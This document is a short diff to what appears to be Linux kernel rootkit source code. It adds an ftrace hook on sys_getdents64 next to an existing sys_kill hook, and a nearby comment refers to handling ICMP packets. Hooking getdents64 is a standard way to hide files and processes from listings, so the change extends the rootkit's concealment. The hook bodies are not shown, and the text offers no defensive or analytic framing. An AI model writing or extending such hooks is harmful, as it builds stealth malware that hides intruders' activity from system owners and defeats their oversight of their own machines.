@@ -14,6 +14,7 @@
 
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", hook_kill, &orig_kill),
+    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64)
 };
 
 // hook for handling icmp packets
